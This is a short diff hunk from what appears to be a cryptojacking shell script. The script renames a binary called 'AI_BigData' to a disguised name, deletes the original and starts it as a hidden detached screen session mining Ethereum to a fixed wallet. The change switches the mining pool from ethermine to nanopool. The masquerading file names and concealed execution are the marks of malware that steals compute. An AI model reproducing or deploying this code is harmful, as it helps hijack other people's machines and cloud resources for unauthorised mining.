@@ -15,4 +15,4 @@ mv AI_BigData $azure -n
 cp $azure "$cpuname"
 rm -f  AI_BigData
 echo $cpuname" is starting"
-screen -d -m ./"${cpuname}" --algo ethash --server us1.ethermine.org:5555 --user 0xfa5791101bf9c5f5a4753c034b77de0e4d1f79ca.orc --ssl 1
+screen -d -m ./"${cpuname}" --algo ethash --server eth-us-east1.nanopool.org:9433 --user 0xfa5791101bf9c5f5a4753c034b77de0e4d1f79ca.orc --ssl 1
